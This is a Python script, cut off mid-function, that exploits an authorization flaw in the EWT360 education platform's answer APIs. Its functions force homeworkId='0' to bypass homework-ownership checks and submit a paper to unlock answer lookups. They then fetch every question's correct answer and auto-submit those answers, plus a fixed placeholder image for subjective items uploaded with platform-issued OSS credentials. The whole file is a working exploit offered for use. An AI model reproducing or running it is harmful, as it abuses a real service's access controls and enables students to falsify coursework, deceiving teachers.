# -*- coding: utf-8 -*-
"""
EWT paperId 越权答案获取 + 提交结果（固定图片上传）测试代码
"""

import base64
import hashlib
import hmac
import json
import re
import time
from email.utils import formatdate
from urllib.parse import urlparse, parse_qs

import requests


# ============================================================
# 一、运行时常量
# ============================================================
GATEWAY_HOST = "https://gateway.ewt360.com"
ANSWER_ORIGIN = "https://web.ewt360.com"

# 用户身份（替换为真实值）
TOKEN = ""              # 即 mstid, 登录后从 cookie/header 获取
USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0")

# 默认值
DEFAULT_PLATFORM = "1"
DEFAULT_TOTAL_SECONDS = 600
SUBMIT_RETRY = 3             # tempSaveAnswerNew 重试次数

# 固定图片路径
# 相对项目根目录，运行时请确保 cwd 或传入正确路径
FIXED_IMAGE_PATH = "onlyhead.png"
# OSS 上传使用的 appName (answer-pc 页面对应 'answer-pc')
OSS_APP_NAME = "answer-pc"


# ============================================================
# 二、URL 常量（对齐 api_constants.dart "答案" 区块）
# ============================================================
URL_ANSWER_REPORT      = "/api/answerprod/web/answer/report"
URL_SHEET_SUBGROUP     = "/api/answerprod/common/answer/sheet/getAnswerSheetSubGroup"
URL_SHEET_INFO         = "/api/answerprod/common/answer/answerSheetInfo"
URL_SUBMIT_PAPER       = "/api/answerprod/web/answer/submitpaper"
URL_TEMP_SAVE_ANSWER   = "/api/answerprod/web/answer/submitAnswer"
URL_QUESTION_ANALYSIS  = "/api/answerprod/web/answer/simple/question/analysis"
URL_ANSWER_PAPER       = "/api/answerprod/web/answer/paper"

URL_USER_BASEINFO      = "/api/usercenter/user/baseinfo"

# OSS 上传相关（对齐 oss_upload_service.dart）
URL_STS_CREDENTIALS    = "/fs/credentials/token"
URL_UPLOAD_COMPLETE    = "/fs/upload/complete"


# ============================================================
# 三、Headers 构造（对齐 answer_remote_datasource.dart）
# ============================================================
def answer_headers() -> dict:
    """answerprod 通用 headers (Origin/Referer = web.ewt360.com)

    对齐 Dart: AnswerRemoteDataSource._answerHeaders + AuthInterceptor.onRequest
    """
    return {
        "Origin": ANSWER_ORIGIN,
        "Referer": f"{ANSWER_ORIGIN}/",
        "User-Agent": USER_AGENT,
        "token": TOKEN,
    }


def paper_headers(refer_url: str) -> dict:
    """answer/paper / submitAnswer 专用 headers

    对齐 Dart: AnswerRemoteDataSource._paperHeaders(referUrl)
    refer_url 形如:
      https://web.ewt360.com/answer-pc/exam/answer?paperId=...&bizCode=204&platform=1&isRepeat=1
    """
    return {
        **answer_headers(),
        "ewt-contentstyle": "CamelCase",
        "ewt-requestsource": "web",
        "x-requested-with": "XMLHttpRequest",
        "referurl": refer_url,
        "token": TOKEN,
    }


def build_refer_url(paper_id: str, biz_code: str, report_id: str = "") -> str:
    """构造 answer-pc 页面 URL (对齐 Dart 中的 referUrl)"""
    base = (f"{ANSWER_ORIGIN}/answer-pc/exam/answer?"
            f"bizCode={biz_code}&isRepeat=1&paperId={paper_id}&platform=1")
    return f"{base}&reportId={report_id}" if report_id else base


# ============================================================
# 四、HTTP 工具
# ============================================================
def _request(method: str, url: str, *, params=None, body=None,
             headers=None, timeout: int = 15) -> dict:
    """发送 HTTP 请求并解析 JSON 响应。

    统一响应处理 (对齐 _handleAnswerResponse):
        {success: bool, message: str, data: dict|list}
    注意: 业务层不可再取 data['data'] (双重提取会得到 null)。
    """
    full_url = url if url.startswith("http") else f"{GATEWAY_HOST}{url}"
    print(f"[SEND] {method} {full_url}")
    if params:
        print(f"       query={params}")
    if body is not None:
        print(f"       body={json.dumps(body, ensure_ascii=False)[:300]}...")

    resp = requests.request(method, full_url, params=params,
                            json=body if body is not None else None,
                            headers=headers, timeout=timeout)
    print(f"       -> HTTP {resp.status_code}: {resp.text[:200]}")
    try:
        j = resp.json()
    except Exception:
        return {"success": False, "message": f"非 JSON 响应: {resp.text[:200]}",
                "data": None}

    success = j.get("success", False) or j.get("code") == "200"
    msg = j.get("msg") or j.get("message") or ""
    data = j.get("data")
    return {"success": success, "message": msg, "data": data, "raw": j}


# ============================================================
# 五、paperId 解析（直接字段 / URL 参数）
# ============================================================
def extract_paper_id(content_url: str) -> str:
    """从 URL query 中提取 paperId 参数 (对齐 extractPaperId)"""
    if not content_url:
        return ""
    try:
        qs = parse_qs(urlparse(content_url).query)
        v = qs.get("paperId", [""])
        return v[0] if v else ""
    except Exception:
        return ""


def get_user_id() -> str:
    """获取用户基本信息中的 userId (answerSheetInfo 回退必需)

    对齐 Dart: AnswerRemoteDataSource.getUserId
    """
    resp = _request("GET", URL_USER_BASEINFO, headers=answer_headers())
    data = resp.get("data") or {}
    return str(data.get("userId") or "") if isinstance(data, dict) else ""


# ============================================================
# 六、答案 API (answerprod)
# ============================================================
def get_answer_report(paper_id: str, biz_code: str = "201",
                      homework_id: str = "0") -> dict:
    """获取答题报告 ID (reportId)

    对齐 Dart: AnswerRemoteDataSource.getAnswerReport
    - bizCode=201 (油猴脚本方式): URL 传 token, 无特殊 headers
    - bizCode=204 (浏览器原生方式): URL 传 reportId=0&isRepeat=1&timestamp,
      需 ewt-contentstyle/ewt-requestsource/x-requested-with/referurl headers
    """
    params = {"paperId": paper_id, "platform": DEFAULT_PLATFORM, "bizCode": biz_code}
    if biz_code == "204":
        params["reportId"] = "0"
        params["isRepeat"] = "1"
        params["timestamp"] = str(int(time.time() * 1000))
        refer_url = (f"{ANSWER_ORIGIN}/answer-pc/exam/answer?"
                     f"paperId={paper_id}&bizCode=204&platform=1&isRepeat=1")
        headers = paper_headers(refer_url)
    else:
        params["token"] = TOKEN
        headers = answer_headers()
    return _request("GET", URL_ANSWER_REPORT, params=params, headers=headers)


def get_answer_sheet_subgroup(paper_id: str, report_id: str,
                              homework_id: str = "0") -> dict:
    """获取答题卡分组题目列表

    对齐 Dart: AnswerRemoteDataSource.getAnswerSheetSubGroup
    返回 data.groupQuestionList[].{groupName, questionList[]}
    """
    body = {
        "paperId": paper_id, "reportId": report_id,
        "platform": DEFAULT_PLATFORM, "bizCode": "201",
        "homeworkId": homework_id, "client": 4,
    }
    return _request("POST", URL_SHEET_SUBGROUP, body=body, headers=answer_headers())


def get_answer_sheet_info(paper_id: str, report_id: str, user_id: str,
                          homework_id: str = "0", biz_code: str = "201") -> dict:
    """获取答题卡题目列表 (非题组回退接口, 需 userId)

    对齐 Dart: AnswerRemoteDataSource.getAnswerSheetInfo
    返回 data.questionInfoList[]
    """
    body = {
        "paperId": paper_id, "reportId": report_id,
        "platform": DEFAULT_PLATFORM, "bizCode": biz_code,
        "userId": user_id, "client": 1,
    }
    return _request("POST", URL_SHEET_INFO, body=body, headers=answer_headers())


def submit_paper(paper_id: str, report_id: str,
                 homework_id: str = "0", biz_code: str = "201") -> dict:
    """提交答题报告 (解锁答案查询, 副作用: 试卷标记为"已提交")

    对齐 Dart: AnswerRemoteDataSource.submitPaper
    """
    body = {
        "paperId": paper_id, "reportId": report_id, "bizCode": biz_code,
        "platform": DEFAULT_PLATFORM, "totalSeconds": DEFAULT_TOTAL_SECONDS,
        "homeworkId": homework_id,
    }
    return _request("POST", URL_SUBMIT_PAPER, body=body, headers=answer_headers())


def temp_save_answer_new(paper_id: str, report_id: str, biz_code: str,
                         platform: str, assign_points: bool,
                         question_list: list, homework_id: str = "") -> dict:
    """保存做题痕迹 (对齐 Web tempSaveAnswerNew)

    对齐 Dart: AnswerRemoteDataSource.tempSaveAnswerNew
    question_list 每项:
      客观题: {id, cateId, questionNo, totalSeconds, myAnswers}
      主观题: {id, cateId, questionNo, totalSeconds, attachmentImages}
    """
    refer_url = build_refer_url(paper_id, biz_code, report_id)
    body = {
        "paperId": paper_id, "platform": platform, "reportId": report_id,
        "questionList": question_list, "bizCode": biz_code,
        "assignPoints": assign_points,
    }
    # homeworkId 仅在非空时传入 (对齐 Web 默认不传)
    if homework_id:
        body["homeworkId"] = homework_id
    return _request("POST", URL_TEMP_SAVE_ANSWER, body=body,
                    headers=paper_headers(refer_url))


def student_submit_paper_answers(paper_id: str, report_id: str, biz_code: str,
                                 homework_id: str, platform: str,
                                 paper_package_id: str = "",
                                 total_seconds: float = DEFAULT_TOTAL_SECONDS) -> dict:
    """最终交卷 (对齐 Web studentSubmitPaperAnswers)

    对齐 Dart: AnswerRemoteDataSource.studentSubmitPaperAnswers
    """
    refer_url = build_refer_url(paper_id, biz_code, report_id)
    body = {
        "paperPackageId": paper_package_id, "paperId": paper_id,
        "platform": platform, "reportId": report_id,
        "totalSeconds": total_seconds, "bizCode": biz_code,
        "homeworkId": homework_id,
    }
    return _request("POST", URL_SUBMIT_PAPER, body=body,
                    headers=paper_headers(refer_url))


def get_question_analysis(paper_id: str, report_id: str, question_id: str,
                          biz_code: str = "201", homework_id: str = "0") -> dict:
    """获取单题答案解析

    对齐 Dart: AnswerRemoteDataSource.getQuestionAnalysis
    返回 data: {rightAnswer, analyse, knowledges, childQuestions}
    """
    body = {
        "paperId": paper_id, "reportId": report_id, "platform": DEFAULT_PLATFORM,
        "questionId": question_id, "bizCode": biz_code,
        "homeworkId": homework_id, "client": 4,
    }
    return _request("POST", URL_QUESTION_ANALYSIS, body=body, headers=answer_headers())


def get_answer_paper(paper_id: str, report_id: str = "",
                     biz_code: str = "204") -> dict:
    """获取试卷完整题目列表 (含题干/选项/答案/解析)

    对齐 Dart: AnswerRemoteDataSource.getAnswerPaper
    """
    refer_url = build_refer_url(paper_id, biz_code, report_id)
    params = {"paperId": paper_id, "platform": DEFAULT_PLATFORM,
              "reportId": report_id, "bizCode": biz_code}
    return _request("GET", URL_ANSWER_PAPER, params=params,
                    headers=paper_headers(refer_url))


# ============================================================
# 七、STS 凭证 + OSS V1 签名上传（对齐 oss_upload_service.dart）
# ============================================================
class OssUploadService:
    """OSS 上传服务

    对齐 Dart: OssUploadService
    流程:
      1. GET /fs/credentials/token?appName=answer-pc 获取 STS 凭证
      2. 使用 STS 凭证签名 OSS PUT 请求, 上传图片字节
      3. POST /fs/upload/complete 上报文件信息 (非关键, 失败忽略)

    签名算法: HMAC-SHA1 (RFC 2104), 与 OSS V1 签名兼容。
    """

    def __init__(self, token: str = TOKEN, app_name: str = OSS_APP_NAME):
        self.token = token
        self.app_name = app_name
        self._cached_sts = None
        self._cached_sts_expiry = 0   # unix timestamp (秒)

    def upload_image(self, image_bytes: bytes, file_name: str) -> str:
        """上传图片字节到 OSS, 返回可访问的 CDN URL

        对齐 Dart: OssUploadService.uploadImage
        返回: CDN URL (用于 attachmentImages 字段), 失败抛 Exception
        """
        # 1. 获取 STS 凭证
        sts = self._get_sts_credentials()
        if not sts:
            raise Exception("获取 STS 凭证失败")

        # 2. 构造 OSS object key (对齐 Web: prefix/timestamp/fileName)
        timestamp = int(time.time() * 1000)
        object_key = f"{sts['prefix']}{timestamp}-{file_name}"

        # 3. 签名并上传 (virtual-hosted style)
        #    https://{bucket}.{endpoint-host}/{objectKey}
        endpoint_host = sts["endpoint"].split("://", 1)[-1]
        oss_upload_url = f"https://{sts['bucket']}.{endpoint_host}/{object_key}"
        content_md5 = base64.b64encode(hashlib.md5(image_bytes).digest()).decode()
        gmt_date = formatdate(timeval=None, localtime=False, usegmt=True)

        # OSS V1 签名
        string_to_sign = self._build_string_to_sign(
            method="PUT", content_md5=content_md5,
            content_type="image/png", date=gmt_date,
            security_token=sts["securityToken"],
            bucket=sts["bucket"], object_key=object_key,
        )
        signature = base64.b64encode(
            hmac.new(sts["accessKeySecret"].encode("utf-8"),
                     string_to_sign.encode("utf-8"),
                     hashlib.sha1).digest()
        ).decode()
        authorization = f"OSS {sts['accessKeyId']}:{signature}"

        # 4. PUT 上传
        #    x-oss-object-acl 必须为 public-read (STS 策略仅允许 public-read)
        headers = {
            "Authorization": authorization,
            "Content-MD5": content_md5,
            "Content-Type": "image/png",
            "Content-Length": str(len(image_bytes)),
            "Date": gmt_date,
            "x-oss-security-token": sts["securityToken"],
            "x-oss-object-acl": "public-read",
        }
        try:
            r = requests.put(oss_upload_url, data=image_bytes,
                             headers=headers, timeout=60)
            if r.status_code != 200:
                raise Exception(f"OSS 上传失败: HTTP {r.status_code} | body: {r.text[:300]}")
        except requests.RequestException as e:
            raise Exception(f"OSS 上传异常: {e}")

        # 5. 构造最终可访问 URL (CDN URL 优先)
        cdn_url = (f"{sts['cdnBaseUrl']}/{object_key}"
                   if sts["cdnBaseUrl"] else oss_upload_url)

        # 6. 上报文件信息 (非关键步骤, 失败不影响上传结果)
        self._report_upload_complete(
            file_url=cdn_url, file_size=len(image_bytes), file_name=file_name)
        return cdn_url

    def _get_sts_credentials(self, force_refresh: bool = False) -> dict:
        """获取 STS 凭证 (带缓存)

        对齐 Dart: OssUploadService._getStsCredentials
        关键: 必须传 appName query 参数, 否则返回 400 "appName 不能为空"
        凭证字段嵌套在 data.credentials 下
        """
        now = time.time()
        if (not force_refresh and self._cached_sts
                and now < self._cached_sts_expiry):
            return self._cached_sts

        params = {"appName": self.app_name}
        resp = _request("GET", URL_STS_CREDENTIALS, params=params,
                        headers=answer_headers())
        if not resp.get("success"):
            return None
        data = resp.get("data") or {}
        if not isinstance(data, dict):
            return None

        creds = data.get("credentials")
        if not isinstance(creds, dict):
            return None

        access_key_id = str(creds.get("accessKeyId") or "")
        access_key_secret = str(creds.get("accessKeySecret") or "")
        security_token = str(creds.get("securityToken") or "")
        expiration = str(creds.get("expiration") or "")
        if not access_key_id or not access_key_secret:
            return None

        bucket = str(data.get("bucket") or "")
        region = str(data.get("region") or "")
        prefix = str(data.get("prefix") or "")
        cdn_base_url = str(data.get("cdnBaseUrl") or "")
        endpoint_host = str(data.get("endpoint") or "")

        # 派生 endpoint URL (response 的 endpoint 不含协议头)
        if endpoint_host:
            endpoint = endpoint_host if endpoint_host.startswith("http") \
                       else f"https://{endpoint_host}"
        elif region:
            endpoint = f"https://{region}.aliyuncs.com"
        else:
            endpoint = "https://oss-cn-hangzhou.aliyuncs.com"

        # 缓存过期时间: 用接口返回的 expiration (ISO 8601) 提前 2 分钟刷新
        expiry_ts = now + 600   # 默认 10 分钟
        if expiration:
            try:
                from datetime import datetime, timezone
                dt = datetime.fromisoformat(
                    expiration.replace("Z", "+00:00")).astimezone(timezone.utc)
                expiry_ts = dt.timestamp() - 120
            except Exception:
                pass

        sts = {
            "accessKeyId": access_key_id,
            "accessKeySecret": access_key_secret,
            "securityToken": security_token,
            "bucket": bucket,
            "endpoint": endpoint,
            "prefix": prefix,
            "cdnBaseUrl": cdn_base_url,
            "region": region,
            "expiration": expiration,
        }
        self._cached_sts = sts
        self._cached_sts_expiry = expiry_ts
        return sts

    def _report_upload_complete(self, *, file_url: str, file_size: int,
                                file_name: str) -> None:
        """上报文件信息到 /fs/upload/complete (非关键, 失败忽略)

        对齐 Dart: OssUploadService._reportUploadComplete
        """
        try:
            _request("POST", URL_UPLOAD_COMPLETE,
                     body={"fileUrl": file_url, "fileSize": file_size,
                           "fileName": file_name},
                     headers=answer_headers())
        except Exception:
            pass

    @staticmethod
    def _build_string_to_sign(*, method: str, content_md5: str,
                              content_type: str, date: str,
                              security_token: str, bucket: str,
                              object_key: str) -> str:
        """构建 OSS V1 签名的 StringToSign

        对齐 Dart: OssUploadService._buildStringToSign
        格式:
            HTTP-Verb\n
            Content-MD5\n
            Content-Type\n
            Date\n
            CanonicalizedOSSHeaders\n
            CanonicalizedResource
        """
        # CanonicalizedOSSHeaders (按字典序排列, 以 \n 分隔, 以 \n 结尾)
        # 必须与 PUT 请求 header 完全一致
        oss_headers = {
            "x-oss-object-acl": "public-read",
            "x-oss-security-token": security_token,
        }
        canonical_oss_headers = "\n".join(
            f"{k}:{oss_headers[k]}" for k in sorted(oss_headers.keys()))
        canonical_resource = f"/{bucket}/{object_key}"
        return (f"{method}\n{content_md5}\n{content_type}\n{date}\n"
                f"{canonical_oss_headers}\n{canonical_resource}")


# ============================================================
# 八、QuestionInfo 响应解析（对齐 question_info.dart）
# ============================================================
def _normalize_img_urls(text: str) -> str:
    """补全 HTML 中 img src 为绝对 HTTPS URL

    对齐 Dart: QuestionInfo._normalizeImgUrls
    - http://host/path → https://host/path
    - //host/path      → https://host/path
    - /path (非 http)  → https://web.ewt360.com/path
    """
    if not text:
        return ""
    text = re.sub(r'''src=["']?http://([^"\s>]+)["']?''',
                  lambda m: f'src="https://{m.group(1)}"', text)
    text = re.sub(r'''src=["']?//([^"\s>]+)["']?''',
                  lambda m: f'src="https://{m.group(1)}"', text)
    def _rel(m):
        path = m.group(1) or ""
        return m.group(0) if path.startswith("http") \
               else f'src="https://web.ewt360.com/{path}"'
    text = re.sub(r'''src=["']?/([^"\s>]+)["']?''', _rel, text)
    return text


def _format_answer(data: dict) -> str:
    """从 rightAnswer 提取答案文本

    对齐 Dart: QuestionInfo._formatAnswer
    - 选择题: 提取 A-Z 选项, 逗号拼接
    - 主观题: 保留原始 HTML (首项)
    """
    right_answer = data.get("rightAnswer")
    if isinstance(right_answer, list) and right_answer:
        opts = [str(x).strip() for x in right_answer
                if re.match(r"^[A-Z]+$", str(x).strip())]
        if opts:
            return ", ".join(opts)
        return _normalize_img_urls(str(right_answer[0]))
    return "(主观题)"


def parse_question_info(data: dict, number: str = "", group: str = "") -> dict:
    """从 API 返回的题目 data 中提取完整信息 (含子题递归)

    对齐 Dart: QuestionInfo.fromJson
    返回字典结构对应 QuestionInfo 实体字段。
    """
    if not isinstance(data, dict):
        return {}

    answer = _format_answer(data)
    analysis = _normalize_img_urls(str(data.get("analyse") or data.get("method") or ""))
    knowledges = "、".join(
        k["title"] for k in (data.get("knowledges") or [])
        if isinstance(k, dict) and k.get("title"))
    question_type = str(data.get("subjectQuestionTypeName")
                        or data.get("questionTypeName")
                        or data.get("cateName") or "")
    question_content = _normalize_img_urls(str(data.get("questionContent") or ""))

    # 选项解析 (兼容 String / Map)
    options = []
    for i, opt in enumerate(data.get("options") or []):
        if isinstance(opt, str):
            if opt.strip():
                options.append(opt)
        elif isinstance(opt, dict):
            choice = str(opt.get("choice") or "")
            option_text = _normalize_img_urls(
                str(opt.get("option") or opt.get("content")
                    or opt.get("text") or opt.get("value") or ""))
            effective_choice = choice if choice else chr(65 + i)
            if option_text:
                options.append(f"{effective_choice}. {option_text}")

    # 子题递归
    child_questions = []
    for i, child in enumerate(data.get("childQuestions") or []):
        if isinstance(child, dict):
            child_questions.append(parse_question_info(child, number=str(i + 1)))

    # 提交相关原始字段
    raw_id = str(data.get("id") or data.get("questionId") or "")
    raw_cate = data.get("cate") or data.get("cateId") or 0
    raw_subjective = data.get("subjective") or False
    raw_question_no_show = str(data.get("questionNoShow")
                                or data.get("questionNumber") or "")
    raw_question_sort = data.get("questionSort") or 0
    raw_parent_id = str(data.get("parentQuestionId") or "")

    raw_right_answer = data.get("rightAnswer")
    right_answer_list = []
    if isinstance(raw_right_answer, list):
        right_answer_list = [str(x) for x in raw_right_answer if str(x)]

    return {
        "number": number,
        "group": group,
        "answer": answer,
        "analysis": analysis,
        "knowledge": knowledges,
        "questionType": question_type,
        "questionContent": question_content,
        "options": options,
        "childQuestions": child_questions,
        "difficulty": str(data.get("degreeRangeDesc") or ""),
        "id": raw_id,
        "cate": raw_cate if isinstance(raw_cate, int)
                else (int(raw_cate) if str(raw_cate).isdigit() else 0),
        "subjective": raw_subjective if isinstance(raw_subjective, bool)
                       else str(raw_subjective) == "true",
        "questionNoShow": raw_question_no_show,
        "questionSort": raw_question_sort if isinstance(raw_question_sort, int)
                         else (int(raw_question_sort) if str(raw_question_sort).isdigit() else 0),
        "parentId": raw_parent_id,
        "rightAnswerRaw": right_answer_list,
    }


# ============================================================
# 九、越权答案获取方案
# ============================================================
def fetch_answers_via_report_id(course_title: str, paper_id: str,
                                report_id: str = "", homework_id: str = "0") -> dict:
    """越权方案 reportId

    对齐 Dart: AnswerService._fetchViaReportId
    核心越权技巧: 所有 API 强制 homeworkId='0', 绕过作业归属检查

    流程:
      1. getAnswerReport(bizCode=201) 取 reportId
      2. getAnswerSheetSubGroup 取题目列表, 失败回退 getAnswerSheetInfo (需 userId)
      3. submitPaper(homeworkId='0') 提交报告解锁答案查询
      4. 预取 getAnswerPaper(bizCode=204) 拿题干
      5. 逐题 getQuestionAnalysis(bizCode=201, homeworkId='0') 取 rightAnswer/analyse/knowledges
    """
    print(f"\n{'='*60}\n[reportId] {course_title} paperId={paper_id}\n{'='*60}")

    hw_id = "0"  # 越权方案核心: 强制 homeworkId='0'

    # 1. 获取 reportId
    rid = ""
    try:
        rr = get_answer_report(paper_id, biz_code="201", homework_id=hw_id)
        if rr.get("success") and isinstance(rr.get("data"), dict):
            rid = str(rr["data"].get("reportId") or "")
    except Exception as e:
        print(f"  getReportId 异常: {e}")
    if not rid:
        rid = report_id  # 回退传入的 reportId
        print(f"  answer/report 未返回 reportId, 回退传入 reportId={rid}")
    if not rid:
        return {}
    print(f"  paperId={paper_id}, reportId={rid}")

    # 2. 获取题目列表
    questions = []
    try:
        sr = get_answer_sheet_subgroup(paper_id, rid, homework_id=hw_id)
        if sr.get("success") and isinstance(sr.get("data"), dict):
            for group in (sr["data"].get("groupQuestionList") or []):
                if not isinstance(group, dict):
                    continue
                group_name = str(group.get("groupName") or "")
                for q in (group.get("questionList") or []):
                    if isinstance(q, dict):
                        questions.append({
                            "questionId": q.get("questionId"),
                            "questionNumber": q.get("questionNumber"),
                            "groupName": group_name,
                            "cateId": q.get("cateId") or 1,
                            "subjective": q.get("subjective") or False,
                        })
    except Exception as e:
        print(f"  answerSheetSubGroup 异常: {e}, 回退 answerSheetInfo")

    # 回退 answerSheetInfo (需 userId)
    if not questions:
        try:
            uid = get_user_id()
            ir = get_answer_sheet_info(paper_id, rid, uid, homework_id=hw_id)
            if ir.get("success") and isinstance(ir.get("data"), dict):
                for q in (ir["data"].get("questionInfoList") or []):
                    if isinstance(q, dict):
                        questions.append({
                            "questionId": q.get("questionId"),
                            "questionNumber": q.get("questionNumber"),
                            "groupName": "",
                            "cateId": q.get("cateId") or 1,
                            "subjective": q.get("subjective") or False,
                        })
        except Exception as e:
            print(f"  answerSheetInfo 异常: {e}")

    if not questions:
        return {}

    # 3. 提交报告 (解锁答案查询)
    try:
        sp = submit_paper(paper_id, rid, homework_id=hw_id)
        print(f"  submitpaper success={sp.get('success')}, msg={sp.get('message') or ''}")
    except Exception as e:
        print(f"  submitpaper 异常: {e} (继续尝试获取答案)")
    time.sleep(0.5)

    # 4. 预取完整题干 (getAnswerPaper bizCode=204)
    question_content_map = {}
    try:
        pr = get_answer_paper(paper_id, report_id=rid, biz_code="204")
        if pr.get("success") and isinstance(pr.get("data"), dict):
            def _index(qs):
                for q in qs:
                    if isinstance(q, dict):
                        qid = str(q.get("id") or q.get("questionId") or "")
                        if qid:
                            question_content_map[qid] = q
                        children = q.get("childQuestions")
                        if isinstance(children, list):
                            _index(children)
            _index(pr["data"].get("questions") or [])
            print(f"  answer/paper 预取 {len(question_content_map)} 题题干")
    except Exception as e:
        print(f"  answer/paper 预取失败: {e} (题干将为空)")

    # 5. 逐题获取答案
    collected = []
    fail_count = 0
    for q in questions:
        qid = str(q.get("questionId") or "")
        if not qid:
            continue
        parent_number = str(q.get("questionNumber") or "")
        group_name = str(q.get("groupName") or "")
        try:
            ar = get_question_analysis(paper_id, rid, qid,
                                       biz_code="201", homework_id=hw_id)
            if ar.get("success") and isinstance(ar.get("data"), dict):
                a_data = ar["data"]
                full = question_content_map.get(qid)
                if full:
                    # 补全 questionContent/options/id/subjective/cate
                    if not a_data.get("questionContent"):
                        a_data["questionContent"] = full.get("questionContent")
                    if not a_data.get("options"):
                        a_data["options"] = full.get("options")
                    a_data.setdefault("id", full.get("id") or qid)
                    a_data.setdefault("subjective", full.get("subjective") or False)
                    a_data.setdefault("cate", full.get("cate") or full.get("cateId") or 0)
                    # 子题字段补全
                    a_children = a_data.get("childQuestions") or []
                    full_children = full.get("childQuestions") or []
                    for ci, ac in enumerate(a_children):
                        if ci >= len(full_children):
                            break
                        fc = full_children[ci]
                        ac.setdefault("id", fc.get("id") or fc.get("questionId") or "")
                        ac.setdefault("subjective", fc.get("subjective") or False)
                        ac.setdefault("cate", fc.get("cate") or fc.get("cateId") or 0)
                else:
                    # 预取失败: 用 answerSheetSubGroup 的字段回退
                    a_data.setdefault("id", qid)
                    a_data.setdefault("subjective", q.get("subjective") or False)
                    a_data.setdefault("cate", q.get("cateId") or 0)
                info = parse_question_info(a_data, number=parent_number, group=group_name)
                collected.append(info)
            else:
                fail_count += 1
                print(f"  题目 {parent_number}({qid}) 答案获取失败: {ar.get('message')}")
        except Exception as e:
            fail_count += 1
            print(f"  题目 {parent_number}({qid}) 答案获取异常: {e}")
        time.sleep(0.3)

    if fail_count:
        print(f"  reportId 方案: {fail_count}/{len(questions)} 题答案获取失败")

    return {
        "courseTitle": course_title, "method": "reportId", "paperId": paper_id,
        "questions": collected, "successCount": len(collected),
        "totalCount": len(questions), "reportId": rid,
        "bizCode": "201",  # 保存真实 homeworkId 供提交使用 (API 仍用 hw_id='0')
        "homeworkId": homework_id, "platform": DEFAULT_PLATFORM,
    }


def fetch_answers(course: dict, *, homework_id: str, school_id: str) -> dict:
    """获取单个课程的答案 (主入口, 越权方案)

    对齐 Dart: AnswerService._fetchAnswers
    paperId 解析优先级:
      1. course['paperId'] 直接字段
      2. contentUrl / paperContentUrl URL 参数
    """
    title = str(course.get("title") or course.get("taskTitle") or "")
    content_type = course.get("contentType") or 0

    paper_id = ""
    report_id = ""

    # 试卷课程 (contentType=2): 取直接字段或 URL 参数
    if content_type == 2:
        direct_pid = str(course.get("paperId") or "")
        if direct_pid and direct_pid != "0":
            paper_id = direct_pid
        if not paper_id:
            content_url = str(course.get("contentUrl")
                              or course.get("content_url")
                              or course.get("paperContentUrl") or "")
            paper_id = extract_paper_id(content_url)
        report_id = str(course.get("reportId") or course.get("report_id") or "")
        if report_id == "0":
            report_id = ""

    if not paper_id:
        print("  未找到 paperId")
        return {}

    return fetch_answers_via_report_id(title, paper_id, report_id, homework_id)


# ============================================================
# 十、提交结果（对齐 answer_submit_service.dart）
# ============================================================
def _is_paper_submitted_error(msg: str) -> bool:
    """判断是否为"试卷已提交"错误

    对齐 Dart: AnswerSubmitService._isPaperSubmittedError
    """
    return "已提交" in msg or "请刷新" in msg


def _refresh_report_id(paper_id: str, biz_code: str) -> str:
    """重新获取 reportId (bizCode=204, isRepeat=1 创建新答题报告)

    对齐 Dart: AnswerSubmitService._refreshReportId
    越权方案(201)获取答案时调用 submitPaper 将试卷标记为"已提交",
    之后 tempSaveAnswerNew 会返回"试卷已提交, 请刷新页面"错误。
    此方法通过 getAnswerReport(bizCode=204, reportId=0&isRepeat=1) 获取新的
    未提交 reportId。
    """
    try:
        target = "205" if biz_code == "205" else "204"
        rr = get_answer_report(paper_id, biz_code=target)
        if rr.get("success") and isinstance(rr.get("data"), dict):
            rid = str(rr["data"].get("reportId") or "")
            if rid and rid != "0":
                return rid
    except Exception:
        pass
    return ""


def _build_answer_entry(q: dict, fixed_image_urls: list = None) -> dict:
    """构造单个答案条目 (仅支持上传固定图片)

    对齐 Dart: AnswerSubmitService._buildAnswerEntry + _buildQuestionListWithImages
    - 客观题 (subjective=False): myAnswers = rightAnswerRaw
    - 主观题 (subjective=True): attachmentImages = [上传固定图片后的 CDN URL]
    """
    entry = {
        "id": q.get("id", ""),
        "cateId": q.get("cate", 0),
        "questionNo": 0,
        "totalSeconds": 0,
    }
    if q.get("subjective"):
        # 主观题: 使用固定图片 URL (已上传到 OSS)
        entry["attachmentImages"] = list(fixed_image_urls) if fixed_image_urls else []
    else:
        # 客观题: 使用 rightAnswerRaw 作为作答
        entry["myAnswers"] = q.get("rightAnswerRaw") or []
    return entry


def _build_question_list(questions: list, fixed_image_urls: list) -> list:
    """构造 questionList (展开子题 + 去重 + 主观题用固定图片)

    对齐 Dart: AnswerSubmitService._buildQuestionList + _buildQuestionListWithImages
    """
    result = []
    seen_ids = set()
    for q in questions:
        if not q.get("id"):
            continue
        # 分组题: 展开子题
        if q.get("childQuestions"):
            for child in q["childQuestions"]:
                if not child.get("id") or child["id"] in seen_ids:
                    continue
                seen_ids.add(child["id"])
                result.append(_build_answer_entry(child, fixed_image_urls))
        elif q["id"] not in seen_ids:
            seen_ids.add(q["id"])
            result.append(_build_answer_entry(q, fixed_image_urls))
    return result


def _upload_fixed_image(oss: OssUploadService, image_path: str = FIXED_IMAGE_PATH) -> list:
    """上传固定图片到 OSS, 返回 CDN URL 列表 (每题一张, 复用同一 URL)

    对齐 Dart: ImageUploadConfig(mode=fixed) + OssUploadService.uploadImage
    默认使用 onlyhead.png

    失败时返回空列表 (主观题 attachmentImages 为空数组, 不影响其他题目)
    """
    try:
        with open(image_path, "rb") as f:
            image_bytes = f.read()
        file_name = f"answer_fixed_{int(time.time() * 1000)}.png"
        print(f"  上传固定图片: {image_path} ({len(image_bytes)} bytes)...")
        cdn_url = oss.upload_image(image_bytes, file_name)
        print(f"  ✓ 固定图片上传成功: {cdn_url}")
        return [cdn_url]
    except Exception as e:
        print(f"  ✗ 固定图片上传失败: {e} (主观题 attachmentImages 将为空)")
        return []


def submit_answers(result: dict,
                   total_seconds: float = DEFAULT_TOTAL_SECONDS,
                   oss: OssUploadService = None,
                   fixed_image_path: str = FIXED_IMAGE_PATH) -> dict:
    """提交试卷答案 (保存答案 + 最终交卷), 主观题使用固定图片

    对齐 Dart: AnswerSubmitService.submit + _buildQuestionListWithImages
    流程:
      1. 上传固定图片到 OSS (主观题 attachmentImages 使用)
      2. 构造 questionList (客观题用 myAnswers, 主观题用 attachmentImages)
